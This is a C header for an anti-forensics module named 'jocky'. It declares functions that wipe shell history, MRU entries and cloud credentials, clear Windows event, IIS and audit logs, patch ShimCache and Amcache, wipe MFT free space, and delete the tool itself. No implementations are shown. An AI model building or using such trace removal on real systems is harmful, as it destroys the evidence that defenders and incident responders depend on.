#ifndef JOCKY_FORENSICS_H
#define JOCKY_FORENSICS_H

#include <stdbool.h>
#include <stdint.h>

/* Advanced Anti-Forensics Module
 *
 * Comprehensive trace elimination based on Nyx tool reference:
 *
 * 1. User-Level Traces
 *    - PowerShell history (PSReadline)
 *    - CMD history and run dialog (RunMRU)
 *    - Most Recently Used (MRU) files
 *    - Cloud utility logs (aws, gcloud, azure)
 *    - Development tool logs (Git, npm, python, node_modules/.cache)
 *
 * 2. System-Level Logs
 *    - Windows Event Logs (all channels)
 *    - IIS web server logs
 *    - Audit logs and security logs
 *
 * 3. Network Artifacts
 *    - ARP cache entries
 *    - DHCP client lease information
 *    - VPN and proxy configuration
 *
 * 4. File System Artifacts
 *    - Prefetch files (.pf)
 *    - USN Journal entries
 *    - ShimCache (AppCompatCache)
 *    - Amcache.hve entries
 *    - MFT free space wiping
 */

/* ─── User-Level Trace Removal ───────────────────────────────── */

int jocky_wipe_powershell_history(void);

int jocky_wipe_cmd_history(void);

int jocky_wipe_run_mru(void);

int jocky_wipe_cloud_credentials(void);

int jocky_wipe_dev_tool_logs(void);

int jocky_wipe_user_artifacts(void);

/* ─── System-Level Log Clearing ──────────────────────────────── */

int jocky_clear_event_logs(void);

int jocky_clear_iis_logs(void);

int jocky_clear_audit_logs(void);

/* ─── Network Artifact Removal ───────────────────────────────── */

int jocky_flush_arp_cache(void);

int jocky_clear_dhcp_leases(void);

int jocky_wipe_vpn_config(void);

int jocky_flush_dns_cache(void);

/* ─── File System Artifact Removal ───────────────────────────── */

int jocky_clear_usn_journal(void);

int jocky_wipe_mft_free_space(const char* drive);

int jocky_wipe_cluster_tips(const char* drive);

int jocky_delete_file_securely(const char* path, int passes);

/* ─── Utility Functions ──────────────────────────────────────── */

int jocky_wipe_prefetch(void);

int jocky_patch_shimcache(void);

int jocky_patch_amcache(void);

int jocky_clear_srum(void);

int jocky_clear_logs(void);

int jocky_wipe_artifacts(void);

int jocky_self_delete(void);

/* ─── Comprehensive Cleanup ──────────────────────────────────── */

int jocky_cleanup_all(void);

int jocky_cleanup_forensic_traces(void);

#endif /* JOCKY_FORENSICS_H */
